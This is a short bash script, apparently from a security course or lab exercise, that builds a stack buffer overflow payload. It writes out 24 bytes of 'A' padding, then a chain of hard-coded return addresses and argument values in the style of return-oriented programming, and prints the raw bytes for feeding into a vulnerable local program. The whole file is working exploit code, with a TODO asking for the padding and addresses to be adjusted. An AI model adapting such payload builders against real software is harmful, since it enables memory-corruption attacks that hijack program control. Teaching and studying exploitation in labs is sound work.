#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

# TODO set the correct padding length and values of addresses and stack variables

padding_length="24"
first_address="\x6f\x13\x40\x00\x00\x00\x00\x00"
first_value="\x09\x00\x00\x00\x00\x00\x00\x00"
second_value="\x00\x00\x00\x00\x00\x00\x00\x00"
second_address="\x71\x13\x40\x00\x00\x00\x00\x00"
third_value="\x06\x00\x00\x00\x00\x00\x00\x00"
third_address="\xc6\x12\x40\x00\x00\x00\x00\x00"

# build payload

payload=""
payload+=$(yes "A" | head -n "$padding_length" | paste -sd "")
payload+="$first_address"
payload+="$first_value"
payload+="$second_value"
payload+="$second_address"
payload+="$third_value"
payload+="$third_address"

# print payload to stdout

echo -ne "$payload"
